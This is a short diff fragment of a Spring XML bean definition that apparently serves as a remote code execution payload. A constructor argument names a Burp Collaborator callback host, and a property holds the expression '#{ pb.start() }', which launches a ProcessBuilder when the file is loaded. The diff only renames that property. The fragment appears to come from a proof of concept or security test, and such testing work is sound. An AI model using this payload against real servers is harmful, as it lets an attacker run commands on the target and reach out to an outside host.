@@ -11,6 +11,6 @@
                 <value>go8p1z7coyvo251lyhk4aldsxj3arz.burpcollaborator.net</value>
             </array>
         </constructor-arg>
-     <property name="whatever" value="#{ pb.start() }"/>
+     <property name="any" value="#{ pb.start() }"/>
   </bean>
 </beans>
